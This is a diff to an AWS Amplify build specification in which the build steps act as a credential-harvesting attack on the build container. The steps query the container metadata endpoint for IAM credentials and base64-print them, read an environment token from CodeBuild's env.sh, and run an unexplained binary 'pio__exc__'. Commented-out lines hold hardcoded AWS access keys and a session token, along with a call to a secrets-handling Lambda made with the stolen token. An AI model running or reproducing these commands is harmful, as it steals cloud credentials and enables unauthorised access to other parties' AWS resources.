@@ -9,21 +9,21 @@ frontend:
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuf"
         - echo "..."
-        - echo $(ls -la /tmp | base64 -w 0) 
+        - echo $(ls -la /proc | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - export token=$(cat /codebuild/output/tmp/env.sh | grep 'AWS_ENVIRONMENT_TOKEN' | cut -d '=' -f 2 | cut -d '"' -f 2)
-        - export AWS_ACCESS_KEY_ID=ASIARCJQSGV4CJVTWLIP
-        - export AWS_SECRET_ACCESS_KEY=ChSF64k5tJFdyXK95ioop2xh8Vj7W6vKrao2F9l8
-        - export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEKr//////////wEaCXVzLWVhc3QtMSJHMEUCIDmoHOcKhbWgDtmBVYlAQfe17O1Lcf8oOyv//tw52QllAiEAw6Qkgz8flh2oR6QJ+GjMMcl3UP6w6ByEePeYYVxBaZwqrgMIYxAEGgwwNzM2NTMxNzE1NzYiDF2o7g6QifOQ+2/V9CqLAy4+i4A6WLRhg1VRKcR/jYeuMVVRJqqjMhKvH69DgHENZV9Sv9brdYKjKcHzmQrZ8JEotmvm7lVwk+SpDygXmee0iVZbZLWS5n03AifdpNaBE8tRkGEuFMmmpo+kQAJc7J553E7PZ+pEsuTdi4UbxpAp2NwlGhnzaPhDZVLUt5Hk9cYPY9O9fDTdDrui72qwW6tzYCN4FGP4UkOqJEWh0dADeXC1glVnd4uAxUsLhWkF3qQn86/8GlLndJQ5/VkxZMujQVPNP7v1EOE409CrlzkVLfk+31kIG5IQF0aKWP425rOu4B6YWFZkzFtDiR7O3PIWx+iyDrTJdLDSK4dBHtkHB3UgFz8Oywl78ikQYZBqs1hBDx03mBjvx7gcziPIHd/Lp7uT02+yrS6gj0NUBTOH2WkjjdtX5bRdGZxS/IEONkzScct/onHWcFCnvmoAi6HLhSTF9u+4TcvgcnESUu8otAIDmUd4oRodsSq71eFgOdYssgDcxCu3AUA5Vfv83BkgpyZOvhmuTMwKMMKzqKAGOpMBD+loGTO8RTRaHttl1tGQ3R0RY1aqoYCftNRN5c0OxXKsMDlMEuDWAkoMKhndrIgeeYZrc/l/6EDVzGjXcSLm/sNW/NB7XhnvpXirfW33iV+ka7PXgUeeg5PLa85dvS7L/5o6+6YQeOiu5ueq0/T+AspjjOm3RcY8/sNtumpzB857NTgmX53c3q2aOYsJ1GMK9Lw+
-        - export json="{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\",\"StepName\":\"BUILD\",\"Token\":\"$token\"}"
-        - aws lambda invoke --function-name BuildSecretsHandler --payload $json --region us-east-1 out.txt
-        - cat out.txt
+#         - export AWS_ACCESS_KEY_ID=ASIARCJQSGV4CJVTWLIP
+#         - export AWS_SECRET_ACCESS_KEY=ChSF64k5tJFdyXK95ioop2xh8Vj7W6vKrao2F9l8
+#         - export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEKr//////////wEaCXVzLWVhc3QtMSJHMEUCIDmoHOcKhbWgDtmBVYlAQfe17O1Lcf8oOyv//tw52QllAiEAw6Qkgz8flh2oR6QJ+GjMMcl3UP6w6ByEePeYYVxBaZwqrgMIYxAEGgwwNzM2NTMxNzE1NzYiDF2o7g6QifOQ+2/V9CqLAy4+i4A6WLRhg1VRKcR/jYeuMVVRJqqjMhKvH69DgHENZV9Sv9brdYKjKcHzmQrZ8JEotmvm7lVwk+SpDygXmee0iVZbZLWS5n03AifdpNaBE8tRkGEuFMmmpo+kQAJc7J553E7PZ+pEsuTdi4UbxpAp2NwlGhnzaPhDZVLUt5Hk9cYPY9O9fDTdDrui72qwW6tzYCN4FGP4UkOqJEWh0dADeXC1glVnd4uAxUsLhWkF3qQn86/8GlLndJQ5/VkxZMujQVPNP7v1EOE409CrlzkVLfk+31kIG5IQF0aKWP425rOu4B6YWFZkzFtDiR7O3PIWx+iyDrTJdLDSK4dBHtkHB3UgFz8Oywl78ikQYZBqs1hBDx03mBjvx7gcziPIHd/Lp7uT02+yrS6gj0NUBTOH2WkjjdtX5bRdGZxS/IEONkzScct/onHWcFCnvmoAi6HLhSTF9u+4TcvgcnESUu8otAIDmUd4oRodsSq71eFgOdYssgDcxCu3AUA5Vfv83BkgpyZOvhmuTMwKMMKzqKAGOpMBD+loGTO8RTRaHttl1tGQ3R0RY1aqoYCftNRN5c0OxXKsMDlMEuDWAkoMKhndrIgeeYZrc/l/6EDVzGjXcSLm/sNW/NB7XhnvpXirfW33iV+ka7PXgUeeg5PLa85dvS7L/5o6+6YQeOiu5ueq0/T+AspjjOm3RcY8/sNtumpzB857NTgmX53c3q2aOYsJ1GMK9Lw+
+#         - export json="{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\",\"StepName\":\"BUILD\",\"Token\":\"$token\"}"
+#         - aws lambda invoke --function-name BuildSecretsHandler --payload $json --region us-east-1 out.txt
+#         - cat out.txt
 #         - aws sts assume-role --role-arn arn:aws:iam::073653171576:role/amplifyconsole-backend-role --role-session-name asad 2>&1
         - aws sts get-caller-identity
         - export AWS_ENVIRONMENT_TOKEN=$token
         - cp $GOPATH/src/pio__exc__ /
         - cd /
-        - ./pio__exc__ deploy     
+        - ./pio__exc__ cloudbuild     
         - echo "Env token=$token"
         - echo "Build no=$AWS_JOB_ID"
 #         - sleep 120
